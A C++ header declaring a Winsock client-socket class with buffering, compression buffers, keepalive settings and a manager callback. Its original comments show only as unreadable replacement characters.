#pragma once
#include <WinSock2.h>
#include "Buffer.h"
#include "Manager.h"

#pragma comment(lib,"ws2_32.lib")


#define FLAG_SIZE	5
#define HDR_SIZE	13
#define MAX_RECV_BUFFER  1024*8
#define MAX_SEND_BUFFER  1024*8    //����ͺͽ������ݵĳ���
 

struct tcp_keepalive {
    u_long  onoff;
    u_long  keepalivetime;
    u_long  keepaliveinterval;
};

#define SIO_KEEPALIVE_VALS    _WSAIOW(IOC_VENDOR,4)

class CClientSocket  
{
	friend class CManager;
public:	
	SOCKET m_Socket;
	HANDLE m_hEvent;
	bool   m_bIsRunning;
	HANDLE m_hWorkerThread;
	BYTE   m_bPacketFlag[FLAG_SIZE];
	CBuffer m_WriteBuffer;
	CBuffer	m_ResendWriteBuffer;     //���ݻ�����
	CBuffer m_CompressionBuffer;     //���ܵ��Ĵ������ƶ�����ѹ������
	CBuffer m_DeCompressionBuffer;   //m_CompressionBuffer���ݵĽ�ѹ������

	CClientSocket();
	virtual ~CClientSocket();
	
	void CClientSocket::Disconnect();
	bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort);
	static DWORD WINAPI WorkThread(LPVOID lparam);
	bool CClientSocket::IsRunning();
	int CClientSocket::Send( LPBYTE lpData, UINT nSize);
	int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize);
	void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize);
	void CClientSocket::setManagerCallBack(CManager *pManager);
	void CClientSocket::RunEventLoop();
private:
	CManager	*m_pManager;     //Ϊ���ܹ��ڵ�ǰ���з���CManager���е�Private ����ʹ������Ԫ
    //�ó�Ա��һ������ĸ�ָ��   �õ��˶�̬
};